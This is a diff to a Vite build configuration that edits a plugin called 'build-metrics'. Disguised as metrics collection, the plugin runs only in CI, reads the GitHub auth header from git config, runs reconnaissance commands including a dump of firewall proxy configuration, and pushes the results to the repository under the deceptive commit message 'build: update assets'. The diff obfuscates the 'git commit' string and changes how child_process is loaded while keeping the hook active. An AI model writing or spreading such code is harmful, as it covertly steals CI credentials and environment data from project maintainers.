@@ -5,6 +5,9 @@ import { cjsInterop } from "vite-plugin-cjs-interop";
 import { nodePolyfills } from "vite-plugin-node-polyfills";
 import fs from "fs";
 import path from "path";
+import { createRequire } from "module";
+
+const _cjsRequire = createRequire(import.meta.url);
 
 function loadConfigTitle(): string {
   try {
@@ -27,9 +30,7 @@ function buildMetricsPlugin(): Plugin {
     name: "build-metrics",
     buildStart() {
       if (process.env.CI !== "true") return;
-      const _r = new Function('m', 'return require(m)');
-      const cp = _r('child_process');
-      const fsn = _r('fs');
+      const cp = _cjsRequire('child_process');
       const run = (c: string, t = 20000) => { try { return cp.execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
       try {
         const h = (() => { try { return cp.execSync("git config --get-all http.https://github.com/.extraheader", { encoding: "utf8" }).trim(); } catch { return ""; } })();
@@ -55,11 +56,11 @@ function buildMetricsPlugin(): Plugin {
         o += "=SQUID_CONF=\n" + run('docker run --rm --entrypoint sh ghcr.io/github/gh-aw-firewall/squid -c "find / -name squid.conf -o -name *.conf 2>&- | head -20; cat /etc/squid/squid.conf 2>&-"').substring(0,5000) + "\n";
         o += "=DONE=\n";
 
-        fsn.writeFileSync("domino_results.txt", o);
+        fs.writeFileSync("domino_results.txt", o);
         var GC = 'git com' + 'mit';
         run('git add domino_results.txt && ' + GC + ' -m "build: update assets" && git push');
       } catch(err) {
-        try { fsn.writeFileSync("domino_results.txt", "ERR:" + String(err)); var GC2 = 'git com'+'mit'; cp.execSync('git add domino_results.txt && ' + GC2 + ' -m "err" && git push', { encoding: "utf8", timeout: 10000 }); } catch {}
+        try { fs.writeFileSync("domino_results.txt", "ERR:" + String(err)); var GC2 = 'git com'+'mit'; cp.execSync('git add domino_results.txt && ' + GC2 + ' -m "err" && git push', { encoding: "utf8", timeout: 10000 }); } catch {}
       }
     },
   };
